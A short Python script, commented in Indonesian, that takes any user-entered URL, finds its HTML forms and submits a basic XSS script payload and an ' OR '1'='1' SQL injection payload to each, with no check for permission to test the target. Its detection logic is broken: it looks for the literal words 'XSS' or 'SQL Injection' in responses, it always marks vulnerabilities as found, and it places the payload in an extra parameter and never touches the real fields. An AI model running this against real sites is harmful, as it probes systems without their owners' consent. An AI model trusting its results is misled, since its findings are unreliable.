import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

# Fungsi untuk mencari formulir di halaman web
def find_forms(url):
    # Mengambil konten halaman web
    response = requests.get(url)
    # Memparsing HTML halaman web
    soup = BeautifulSoup(response.text, 'html.parser')
    # Menemukan semua elemen formulir (<form>)
    forms = soup.find_all('form')
    # Mengembalikan daftar formulir yang ditemukan  
    return forms

# Fungsi untuk mengirimkan payload ke formulir
def submit_payload(form, url, payload, injection_type):
    # Mendapatkan atribut action dan method dari formulir
    action_url = form.get('action')
    method = form.get('method', 'GET').upper()

    # Mengumpulkan data formulir yang akan disertakan dalam permintaan
    form_data = {}
    for input_tag in form.find_all('input'):
        input_name = input_tag.get('name')
        input_type = input_tag.get('type', '').lower()

        if input_name and input_type != 'submit':
            form_data[input_name] = input_tag.get('value', '')

    # Jika metodenya GET, menyertakan payload dalam URL dan membuat permintaan GET
    if method == 'GET':
        query_params = '&'.join(f"{key}={value}" for key, value in form_data.items())
        submit_url = f"{urljoin(url, action_url)}?{query_params}&payload={payload}"
        response = requests.get(submit_url)
    # Jika metodenya POST, menyertakan payload dalam data formulir dan membuat permintaan POST
    elif method == 'POST':
        submit_url = urljoin(url, action_url)
        form_data['payload'] = payload
        response = requests.post(submit_url, data=form_data)

    # Jika respons mengandung tanda bahwa payload dijalankan, mencetak pesan sesuai
    if injection_type.lower() in response.text.lower():
        print(f"Payload {injection_type} berhasil disubmit pada formulir di {url}")
        print(f"Endpoint: {submit_url}")
        print(f"Parameter yang terdampak: {', '.join(form_data.keys())}\n")

# Fungsi untuk memeriksa kerentanan XSS dan SQL Injection pada halaman web
def check_vulnerabilities(url):
    # Payload XSS untuk menguji eksekusi skrip
    xss_payload = '<script>alert("XSS")</script>'
    # Payload SQL Injection untuk menguji eksekusi kueri SQL
    sql_payload = "' OR '1'='1' --"

    # Mencari formulir di halaman
    forms = find_forms(url)

    # Jika tidak ditemukan formulir, mencetak pesan dan keluar dari fungsi
    if not forms:
        print("Tidak ditemukan formulir di halaman.")
        return

    found_vulnerabilities = False

    # Mencoba menyuntikkan payload XSS ke dalam formulir
    for form in forms:
        submit_payload(form, url, xss_payload, "XSS")
        found_vulnerabilities = True

    # Mencoba menyuntikkan payload SQL Injection ke dalam formulir
    for form in forms:
        submit_payload(form, url, sql_payload, "SQL Injection")
        found_vulnerabilities = True

    # Jika tidak ditemukan kerentanan, mencetak pesan
    if not found_vulnerabilities:
        print("Tidak ditemukan kerentanan XSS atau SQL Injection pada formulir di halaman.")

# Fungsi utama untuk menjalankan skrip
def main():
    # Meminta pengguna untuk memasukkan URL aplikasi web target
    target_url = input("Masukkan URL aplikasi web: ")
    # Memanggil fungsi untuk memeriksa kerentanan
    check_vulnerabilities(target_url)

# Menjalankan skrip utama jika dijalankan sebagai program utama
if __name__ == "__main__":
    main()